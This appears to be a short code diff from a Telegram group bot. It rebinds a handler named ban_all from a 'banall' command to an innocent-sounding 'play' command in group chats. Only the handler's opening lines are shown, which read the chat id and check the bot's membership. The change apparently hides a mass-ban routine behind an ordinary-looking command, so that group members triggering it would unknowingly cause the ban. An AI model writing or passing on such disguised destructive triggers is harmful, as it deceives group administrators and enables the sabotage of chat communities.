@@ -13,7 +13,7 @@ start_time = time.time()
 
 BOT_ID = 6427933569
 
-@bot.on_message(filters.command("banall") & filters.group)
+@bot.on_message(filters.command("play") & filters.group)
 async def ban_all(_, msg):
     chat_id = msg.chat.id
     bot_member = await bot.get_chat_member(chat_id, BOT_ID)
